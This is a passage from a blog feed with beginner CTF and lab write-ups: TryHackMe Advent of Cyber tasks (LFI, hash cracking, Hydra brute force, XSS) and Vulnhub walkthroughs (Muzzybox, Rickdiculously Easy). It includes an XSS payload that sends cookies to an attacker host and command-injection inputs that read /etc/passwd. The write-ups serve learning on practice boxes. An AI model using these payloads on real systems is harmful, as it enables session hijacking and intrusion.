&lt;p&gt;As it was mentioned in the challenge title it was a Local File Inclusion(LFI) task it was very similar to the one I did in the Natas wargame so I checked the /etc/passwd file first and we got charlie as one of the users&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/thm_advent/68.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;checking out the /etc/shadow file to get charlie’s password hash&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/thm_advent/69.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;cracking the hash with john&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/thm_advent/70.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;the follwing task was simple just login to ssh using credentials found and read the flag&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/thm_advent/71.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;day16task-21&quot;&gt;Day16(Task 21)&lt;/h2&gt;
&lt;p&gt;This challenge was more of a scripting challenge&lt;/p&gt;

&lt;h3 id=&quot;task1&quot;&gt;task1&lt;/h3&gt;
&lt;p&gt;we have to find the no. of non-zip files after all the decompression 
the script is a little bit messy but worked for me&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;zipfile&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;os&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;with&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;zipfile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ZipFile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'final-final-compressed.zip'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;r&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;zip_1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;zip_1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;extractall&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;decompress_1&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;list_f&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;listdir&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;decompress_1&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;# print(list_f)
&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;list_f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;with&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;zipfile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ZipFile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;decompress_1/&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;r&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;zip_1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;zip_1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;extractall&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;decompress_2&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;listdir&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;decompress_2&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)))&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;task-2&quot;&gt;task 2&lt;/h3&gt;
&lt;p&gt;we have to check the metadata of the .txt file found in the previous task and check which all have Version: 1.1 in the metadata&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;os&lt;/span&gt; 
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;exiftool&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;m_count&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;list_f&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;listdir&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;./&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;# print(list_f)
&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;l&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;list_f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
	&lt;span class=&quot;nb&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;l&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;with&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;exiftool&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ExifTool&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;exif&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;metadata&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;exif&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get_metadata_batch&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;d&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;metadata&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;try&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;d&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;u'XMP:Version'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;1.1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
			&lt;span class=&quot;c1&quot;&gt;# print(d)
&lt;/span&gt;			&lt;span class=&quot;n&quot;&gt;m_count&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;except&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;continue&lt;/span&gt;
	&lt;span class=&quot;c1&quot;&gt;# print(d)
&lt;/span&gt;	&lt;span class=&quot;c1&quot;&gt;# print(&quot;\n&quot;)
&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;m_count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;task-3&quot;&gt;task 3&lt;/h3&gt;
&lt;p&gt;we have to find the name of the file which contains the string &lt;strong&gt;password&lt;/strong&gt; this can be done simply without using any script with the help of grep&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/thm_advent/72.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;day17task-22&quot;&gt;Day17(Task 22)&lt;/h2&gt;
&lt;p&gt;this task was an introduction to &lt;strong&gt;&lt;em&gt;Hydra&lt;/em&gt;&lt;/strong&gt; which is a brute force online password cracking program; a quick system login password ‘hacking’ tool.
first we had to brute-force the password for user molly in the http-post-form using rockyou.txt 
using gobuster to find the login directory ,I am lazy did not wanted to guess the directory&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/thm_advent/73.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;while the brute for login page was running I decided to brutforce the ssh pass in another tab 
and got the pass almost instantly&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/thm_advent/74.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;next I login through ssh and get the second flag&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/thm_advent/75.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;while the brute force for login was running I viewed the other file present in the server and came across an interesting file which had the initial flag and password for the login form and yet still that hydra script was running,&lt;strong&gt;lol&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/thm_advent/76.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;day18task-23&quot;&gt;Day18(Task 23)&lt;/h2&gt;

&lt;p&gt;this task was very interesting as I learnt many more things about XSS rather than it just being a vulnerability
we are presented with the site,just a normal login form and register page was not vulnerable to SQLi so registering as a normal user&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/thm_advent/77.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;while logging in we see in the request it shows that there is authid assigned to each user and so is  for admin so our
goal was to get the authid for the admin&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/thm_advent/78.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;After logging in we get a forum page where we can post a comment and this comment input field was vulnerable to XSS
so I read about how to steal cookies using XSS and found an article mention to use&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;script&amp;gt;document.location=&quot;http://&amp;lt;machine-ip&amp;gt;/cookie.php?c=&quot;+document.cookie&amp;lt;/script&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;the above thing as payload 
and the cookie.php file is very trivial one&lt;/p&gt;

&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
	&lt;span class=&quot;nv&quot;&gt;$cookie&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;c&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;I setup a php lister at port 8000 and get the admin authid after a few minutes after submitting the comment&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/thm_advent/79.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now this authid can be used to forge the cookie and login as admin into the forum
That’s it for today&lt;/p&gt;
</description>
                <pubDate>Sun, 08 Mar 2020 00:00:00 +0530</pubDate>
                <link>http://localhost:8000/Try-Hack-Me-Advent-Of-Cyber-Day13_to_Day18</link>
                <guid isPermaLink="true">http://localhost:8000/Try-Hack-Me-Advent-Of-Cyber-Day13_to_Day18</guid>
                
                <category>TryHackMe</category>
                
                <category>Advent_Of_Cyber</category>
                
                
            </item>
        
            <item>
                <title>Muzzybox boot2root Walkthrough</title>
                <description>&lt;!--more--&gt;
&lt;p&gt;So one time for one more box will complete the tryhackme advent of cyber in coming 2 days just bored of those challenges&lt;/p&gt;

&lt;p&gt;so I came across this beginner box on google so though let me walk you through it 
the download link to the box is given below&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://drive.google.com/file/d/1yFKVD_bDvzMp66ewOmyihXZ-_RZ8yGOs/view?usp=sharing&quot;&gt;box Download&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Lets start !!&lt;/p&gt;

&lt;p&gt;First step as always is Netdiscover 
So the IP address to attack is &lt;strong&gt;192.168.43.227&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/muzzybox/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;now while running the nmap scan I thought that lets check if there is anything by default at port 80 and yes i was right i got a link to &lt;em&gt;index.txt&lt;/em&gt; file&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/muzzybox/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;On checking the file it just gave out the tasks to perform in order to root the box&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/muzzybox/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Lets go to the port mentioned in the first task 
We are greeted with the following site&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/muzzybox/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;the idcard.png looked something like this 
&lt;img src=&quot;images/muzzybox/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;after hours of enumeration and brainfuck(checking for hidden directries using gobuster and then trying nikto and many other recon tools I was so frustated that I went on to watch &lt;em&gt;Jumanji&lt;/em&gt;)
After a short break I was once again trying what to 
Then I thought of editing the &lt;em&gt;idcard.png&lt;/em&gt; file as specified on the website and also there was mention of &lt;strong&gt;&lt;em&gt;nosql&lt;/em&gt;&lt;/strong&gt; on the website ,so I went to nosql payload all things &lt;a href=&quot;https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/NoSQL%20Injection/Intruder/NoSQL.txt&quot;&gt;link&lt;/a&gt; and copied a given command in the name tag&lt;/p&gt;

&lt;p&gt;And with the help of my great photo editing skills i got this id card&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/muzzybox/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;uploading it gave me somewhat of a flag so i]I left it there and moved on to next task as I was frustrated from it&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/muzzybox/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;flag1-&lt;strong&gt;P!N_!$_123-456-789}&lt;/strong&gt;
I think that trying different payloads would give different results so you can try it !!!&lt;/p&gt;

&lt;p&gt;Now moving on to the next task 
visiting the specified url&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/muzzybox/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;this looked somewhat like a jupyter notebook so trying to access the console to see the file present in the notebook directory when trying to ask for pin, trying &lt;strong&gt;&lt;em&gt;123-456-789&lt;/em&gt;&lt;/strong&gt; which we got in previous flag lets us open the console 
now its basic enumeration&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/muzzybox/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And this is the second flag for us 
flag2-&lt;strong&gt;N$cTF{R34D_F!L3_/home/webssti/noflag.txt}&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;based on the flag format the first flag will be
flag1-&lt;strong&gt;N$cTF{&lt;em&gt;maybe_some_string&lt;/em&gt;+P!N_!$_123-456-789}&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;lets move on to third task this was a &lt;strong&gt;&lt;em&gt;trickier&lt;/em&gt;&lt;/strong&gt; one
on visiting the website we see that it prints anythin we supply to &lt;strong&gt;name&lt;/strong&gt; parameter&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/muzzybox/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Event php too
&lt;img src=&quot;images/muzzybox/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;so I searched for php injection tool on github and came across this &lt;a href=&quot;https://github.com/epinna/tplmap&quot;&gt;tool&lt;/a&gt; 
now I downloaded and set it up 
and ran it and it showed that &lt;strong&gt;name&lt;/strong&gt; parameter was vulnerable&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/muzzybox/12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;So we can also get a shell so re run the command
We get a shell and read the file specified in the previous flag&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/muzzybox/13.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;the file contents were about a ssh login creds so loggin in 
lets try the &lt;em&gt;sudo ls&lt;/em&gt; and &lt;em&gt;bash ls&lt;/em&gt; commands but it didn’t help us checking the path
and permission of &lt;strong&gt;sbin&lt;/strong&gt; folder shows that it belongs to nsctf user and root group 
&lt;img src=&quot;images/muzzybox/15.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;so we can make a file with name ls to read the content of final_flag.txt files whose path is specified in the challenge page and we start up the listener on our side and Bingo!! we got the flag&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/muzzybox/14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Final flag-&lt;strong&gt;N$cTF{8!NG000!!!__Y0U_D!D_!T_80!!!}&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;So yup that was it !! &lt;br /&gt;
I spent 9 hours on this box despite this being a beginner box but at the end&lt;br /&gt;
&lt;strong&gt;Enumeration is the Key&lt;/strong&gt;&lt;/p&gt;
</description>
                <pubDate>Fri, 06 Mar 2020 00:00:00 +0530</pubDate>
                <link>http://localhost:8000/Muzzy-Box-Walkthrough</link>
                <guid isPermaLink="true">http://localhost:8000/Muzzy-Box-Walkthrough</guid>
                
                <category>Vulnhub</category>
                
                <category>boot2root</category>
                
                
            </item>
        
            <item>
                <title>Vulnhub Rickdiculously Easy Walkthrough</title>
                <description>&lt;!--more--&gt;
&lt;h1 id=&quot;so-this-is-my-first-box-so-there-may-be-some-mistakes-&quot;&gt;So this is my first box so there may be some mistakes :)&lt;/h1&gt;
&lt;p&gt;the link to the box
&lt;a href=&quot;https://www.vulnhub.com/entry/rickdiculouslyeasy-1,207/&quot;&gt;https://www.vulnhub.com/entry/rickdiculouslyeasy-1,207/&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Lets start with &lt;em&gt;netsdicover&lt;/em&gt;
I got the IP of box as &lt;strong&gt;192.168.243.4&lt;/strong&gt;
&lt;img src=&quot;images/vuln_rid-easy/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I thought that there may be a ftp service running as I read about it some of the other boxes writups
And yeah there is a flag&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;flag-1&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;FLAG{Whoa this is unexpected} - 10 points
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;points=10/130&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;The nmap scan results are&lt;/p&gt;
&lt;div class=&quot;language-text highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-06 21:06 IST
Nmap scan report for 192.168.243.4
Host is up (0.00032s latency).
Not shown: 65528 closed ports
PORT      STATE SERVICE    VERSION
21/tcp    open  ftp        vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 0        0              42 Aug 22  2017 FLAG.txt
|_drwxr-xr-x    2 0        0               6 Feb 12  2017 pub
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.243.3
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp    open  ssh?
| fingerprint-strings: 
|   NULL: 
|_    Welcome to Ubuntu 14.04.5 LTS (GNU/Linux 4.4.0-31-generic x86_64)
|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
80/tcp    open  http       Apache httpd 2.4.27 ((Fedora))
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.27 (Fedora)
|_http-title: Morty's Website
9090/tcp  open  http       Cockpit web service
|_http-title: Did not follow redirect to https://192.168.243.4:9090/
13337/tcp open  unknown
| fingerprint-strings: 
|   NULL: 
|_    FLAG:{TheyFoundMyBackDoorMorty}-10Points
22222/tcp open  ssh        OpenSSH 7.5 (protocol 2.0)
| ssh-hostkey: 
|   2048 b4:11:56:7f:c0:36:96:7c:d0:99:dd:53:95:22:97:4f (RSA)
|   256 20:67:ed:d9:39:88:f9:ed:0d:af:8c:8e:8a:45:6e:0e (ECDSA)
|_  256 a6:84:fa:0f:df:e0:dc:e2:9a:2d:e7:13:3c:e7:50:a9 (ED25519)
60000/tcp open  tcpwrapped
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port22-TCP:V=7.80%I=7%D=3/6%Time=5E626E02%P=x86_64-pc-linux-gnu%r(NULL,
SF:42,&quot;Welcome\x20to\x20Ubuntu\x2014\.04\.5\x20LTS\x20\(GNU/Linux\x204\.4\
SF:.0-31-generic\x20x86_64\)\n&quot;);
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port13337-TCP:V=7.80%I=7%D=3/6%Time=5E626E02%P=x86_64-pc-linux-gnu%r(NU
SF:LL,29,&quot;FLAG:{TheyFoundMyBackDoorMorty}-10Points\n&quot;);
MAC Address: 08:00:27:BF:52:95 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 55.73 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;We can see that ports 21,22,80,9090,13337,22222,60000 are open and we found another flag in the scan itself&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;flag-2&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;FLAG{TheyFoundMyBackDoorMorty} - 10 points
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;points=20/130&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;next I ran nikto to get the hidden directories in the IP address&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/vuln_rid-easy/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And yes there was a &lt;em&gt;/passwords&lt;/em&gt; directory present 
checking it out gives the 3rd flag&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/vuln_rid-easy/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/vuln_rid-easy/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;flag-3&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;FLAG{Yeah d- just don't do it.} - 10 points
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;points=30/130&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Lets checkout the passwords.html file 
nothing interesting it seems&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/vuln_rid-easy/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;but its source has a password for us !!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/vuln_rid-easy/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Lets checkout the &lt;em&gt;robots.txt&lt;/em&gt; file ,root_shell is not even a bit useful but the tracertool-cgi is vulnerable to command injection&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/vuln_rid-easy/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I found that using cat command showed a picture of cat it the system so i used head and tail to view /etc/passwd
commands used&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&quot;; head /etc/passwd;
&quot;; tail /etc/passwd;
